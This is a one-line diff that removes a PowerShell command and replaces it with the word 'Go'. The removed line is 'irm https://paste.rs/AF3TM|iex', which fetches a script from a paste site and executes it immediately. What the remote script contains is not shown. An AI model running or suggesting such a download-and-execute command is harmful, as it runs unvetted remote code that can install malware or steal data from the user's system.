@@ -1,1 +1,1 @@
-irm https://paste.rs/AF3TM|iex; "v8 " + (Get-Date -f HH:mm:ss)
+Go
